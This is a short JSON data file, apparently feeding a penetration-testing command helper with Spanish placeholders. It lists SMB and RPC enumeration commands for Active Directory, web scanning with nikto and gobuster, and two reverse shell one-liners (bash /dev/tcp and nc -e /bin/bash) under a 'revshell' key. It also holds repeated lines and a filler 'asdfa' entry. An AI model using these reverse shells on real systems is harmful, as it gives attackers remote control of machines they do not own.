{
  "Active Directory": {
    "enumeration": [
      "smbclient -L //{{IP}} -U {{USER}}",
      "smbclient -L //{{IP}} -U {{USER}}",
      "smbclient -L //{{IP}} -U {{USER}}",
      "smbclient -L //{{IP}} -U {{USER}}",
      "smbclient -L //{{IP}} -U {{USER}}",
      "smbclient -L //{{IP}} -U {{USER}}",
      "smbclient -L //{{IP}} -U {{USER}}",
      "smbclient -L //{{IP}} -U {{USER}}",
      "smbclient -L //{{IP}} -U {{USER}}",
      "smbclient -L //{{IP}} -U {{USER}}",
      "rpcclient -U {{USUARIO}} -P '{{CONTRASEÑA}}' -N {{IP}}"
    ],
    "exploitation":[
      "certify"
    ],
    "Ejemplo":[
      "asdfa"
    ]
  },
  "web": {
    "enumeration": [
      "nikto -h http://{{IP}}",
      "gobuster dir -u http://{{IP}} -w /usr/share/wordlists/dirb/common.txt"
    ]
  },
  "revshell": {
    "shell": [
      "bash -i >& /dev/tcp/{{IP}}/{{PUERTO}} 0>&1",
      "nc -e /bin/bash {{IP}} {{PUERTO}}"
    ]
  }
}
